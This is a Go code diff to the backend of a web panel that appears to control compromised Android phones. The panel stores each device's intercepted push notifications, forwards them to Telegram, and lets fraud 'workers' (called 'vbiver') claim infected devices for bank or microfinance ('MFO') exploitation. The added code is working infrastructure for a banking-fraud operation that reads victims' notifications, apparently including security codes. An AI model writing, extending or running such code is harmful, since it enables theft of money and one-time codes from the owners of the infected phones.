@@ -82,7 +82,7 @@ func HandleDevicePushLogs(w http.ResponseWriter, r *http.Request) {
 	teamID := SessionTeamID(r)
 
 	rows, err := db.DB.Query(
-		"SELECT id, package, title, text, created_at FROM push_logs WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
+		"SELECT id, package, COALESCE(app_name,''), title, text, created_at FROM push_logs WHERE device_id = ? AND team_id = ? ORDER BY created_at DESC LIMIT 200",
 		deviceID, teamID,
 	)
 	if err != nil {
@@ -94,10 +94,13 @@ func HandleDevicePushLogs(w http.ResponseWriter, r *http.Request) {
 	var logs []map[string]any
 	for rows.Next() {
 		var id int
-		var pkg, title, text, created string
-		rows.Scan(&id, &pkg, &title, &text, &created)
+		var pkg, appName, title, text, created string
+		rows.Scan(&id, &pkg, &appName, &title, &text, &created)
+		if appName == "" {
+			appName = appDisplayName(pkg, "")
+		}
 		logs = append(logs, map[string]any{
-			"id": id, "package": pkg, "title": title, "text": text, "created_at": created,
+			"id": id, "package": pkg, "app_name": appName, "title": title, "text": text, "created_at": created,
 		})
 	}
 	if logs == nil {
@@ -156,6 +159,7 @@ func HandleDeviceLabel(w http.ResponseWriter, r *http.Request) {
 		DeviceID string `json:"device_id"`
 		Label    string `json:"label"`
 		Notes    string `json:"notes"`
+		Alias    string `json:"alias"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
 	if body.DeviceID == "" {
@@ -163,8 +167,75 @@ func HandleDeviceLabel(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	teamID := SessionTeamID(r)
-	db.DB.Exec("UPDATE devices SET label = ?, notes = ? WHERE device_id = ? AND team_id = ?", body.Label, body.Notes, body.DeviceID, teamID)
-	LogActionFromRequest(r, ActionEditLabel, body.DeviceID, "Label: "+body.Label)
+	db.DB.Exec("UPDATE devices SET label = ?, notes = ?, alias = ? WHERE device_id = ? AND team_id = ?", body.Label, body.Notes, body.Alias, body.DeviceID, teamID)
+	LogActionFromRequest(r, ActionEditLabel, body.DeviceID, "Label: "+body.Label+" Alias: "+body.Alias)
+	writeJSON(w, map[string]any{"success": true})
+}
+
+func HandleClaimDevice(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		writeJSON(w, map[string]any{"error": "method not allowed"})
+		return
+	}
+	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/claim/"), "/")
+	var deviceID string
+	if len(parts) >= 2 {
+		deviceID = parts[1]
+	}
+	teamID := SessionTeamID(r)
+	if deviceID == "" || teamID == "" {
+		writeJSON(w, map[string]any{"error": "missing params"})
+		return
+	}
+	var body struct {
+		LockType    string `json:"lock_type"`
+		VbiverLogin string `json:"vbiver_login"`
+	}
+	json.NewDecoder(r.Body).Decode(&body)
+	if body.LockType != "MFO" && body.LockType != "BANK" {
+		writeJSON(w, map[string]any{"error": "invalid lock_type"})
+		return
+	}
+	col := "mfo_locked_by"
+	if body.LockType == "BANK" {
+		col = "bank_locked_by"
+	}
+	login := body.VbiverLogin
+	if login == "" {
+		login = r.URL.Query().Get("login")
+	}
+	db.DB.Exec("UPDATE devices SET "+col+" = ? WHERE device_id = ? AND team_id = ?", login, deviceID, teamID)
+	writeJSON(w, map[string]any{"success": true, "worker": login})
+}
+
+func HandleUnclaimDevice(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		writeJSON(w, map[string]any{"error": "method not allowed"})
+		return
+	}
+	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/panel/unclaim/"), "/")
+	var deviceID string
+	if len(parts) >= 2 {
+		deviceID = parts[1]
+	}
+	teamID := SessionTeamID(r)
+	if deviceID == "" || teamID == "" {
+		writeJSON(w, map[string]any{"error": "missing params"})
+		return
+	}
+	var body struct {
+		LockType string `json:"lock_type"`
+	}
+	json.NewDecoder(r.Body).Decode(&body)
+	if body.LockType != "MFO" && body.LockType != "BANK" {
+		writeJSON(w, map[string]any{"error": "invalid lock_type"})
+		return
+	}
+	col := "mfo_locked_by"
+	if body.LockType == "BANK" {
+		col = "bank_locked_by"
+	}
+	db.DB.Exec("UPDATE devices SET "+col+" = '' WHERE device_id = ? AND team_id = ?", deviceID, teamID)
 	writeJSON(w, map[string]any{"success": true})
 }
 
@@ -238,14 +309,16 @@ func HandleDevicePushNotification(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if deviceID != "" {
+		appName := appDisplayName(pkg, "")
 		db.DB.Exec(
-			"INSERT INTO push_logs (device_id, team_id, package, title, text) VALUES (?, ?, ?, ?, ?)",
-			deviceID, teamID, pkg, title, text,
+			"INSERT INTO push_logs (device_id, team_id, package, app_name, title, text) VALUES (?, ?, ?, ?, ?, ?)",
+			deviceID, teamID, pkg, appName, title, text,
 		)
 
 		SendTelegramNotification(teamID, "push", map[string]string{
 			"device_id": deviceID,
 			"package":   pkg,
+			"app_name":  appName,
 			"title":     title,
 			"text":      text,
 		})
